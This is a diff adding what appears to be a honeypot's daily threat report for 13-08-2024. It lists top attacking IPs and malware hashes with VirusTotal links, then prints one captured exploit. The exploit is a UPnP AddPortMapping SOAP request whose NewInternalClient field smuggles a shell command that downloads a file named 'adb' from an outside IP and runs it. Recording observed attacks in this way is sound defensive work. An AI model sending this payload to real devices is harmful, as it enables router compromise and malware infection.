@@ -1,0 +1,37 @@
+Top 5 IPs for 13-08-2024 :
+
+152.228.131.33
+194.113.236.217
+133.18.175.122
+182.176.168.253
+96.78.175.36
+
+
+Malware Observed:
+
+
+608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+https://www.virustotal.com/gui/file/608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+
+
+7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+https://www.virustotal.com/gui/file/7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+
+
+d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+https://www.virustotal.com/gui/file/d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Commands/exploits observed
+
+
+POST /UD/?9 HTTP/1.1
+User-Agent: r00ts3c-owned-you
+Content-Type: text/xml
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47449</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`>/tmp/.e && cd /tmp; >/var/dev/.e && cd /var/dev; wget http://176.123.168.160/adb; chmod 777 adb; sh adb; rm adb;`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
